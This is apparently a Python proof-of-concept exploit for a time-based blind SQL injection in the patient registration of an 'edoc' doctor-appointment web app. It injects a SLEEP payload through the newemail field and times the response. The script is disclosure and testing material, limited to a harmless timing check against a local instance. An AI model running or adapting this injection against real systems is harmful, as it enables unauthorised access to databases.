#!/usr/bin/env python3
"""
PoC - edoc-doctor-appointment-system: unauthenticated time-based blind INSERT
SQL injection in the patient self-registration flow.

  signup.php (step 1, fills $_SESSION['personal'])
    -> create-account.php (step 2): $_POST['newemail'] is concatenated into two
       INSERT statements (patient, webuser) executed with mysqli::query().

Harmless payloads only: SLEEP-based timing proof. Run it against a LOCAL,
ISOLATED instance that you own.

Usage:
    python3 poc-registration-sqli.py http://127.0.0.1:8080

Expected output on a vulnerable instance:
    baseline : 0.02s
    payload  : ~10.05s   (2 x SLEEP(5): both INSERT statements evaluate it)
    VULNERABLE
"""

import http.cookiejar
import sys
import time
import urllib.parse
import urllib.request

if len(sys.argv) != 2:
    print(__doc__)
    sys.exit(1)

base = sys.argv[1].rstrip("/")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    t0 = time.perf_counter()
    opener.open(base + path, data).read()
    return time.perf_counter() - t0


# Step 1: personal details -> $_SESSION['personal'] (signup.php), keeps cookie
post("/signup.php", {
    "fname": "Night", "lname": "Tester", "address": "1 Test St",
    "nic": "987654321", "dob": "2000-01-01",
})

# Step 2 baseline: benign email, new row created normally
t_baseline = post("/create-account.php", {
    "newemail": "clean%d@test.local" % int(time.time()),
    "newpassword": "x123", "cpassword": "x123", "tele": "999",
})

# Step 2 payload: newemail = 1'+(SELECT SLEEP(5))+'1
# (numeric-string arithmetic avoids MySQL strict-mode error 1292)
t_payload = post("/create-account.php", {
    "newemail": "1'+(SELECT SLEEP(5))+'1",
    "newpassword": "x123", "cpassword": "x123", "tele": "999",
})

print("baseline : %.2fs" % t_baseline)
print("payload  : %.2fs" % t_payload)
if t_payload - t_baseline > 5:
    print("VULNERABLE (both INSERT sinks evaluate the injected newemail)")
else:
    print("inconclusive (expected ~2 x SLEEP(5) ~ 10s delay)")
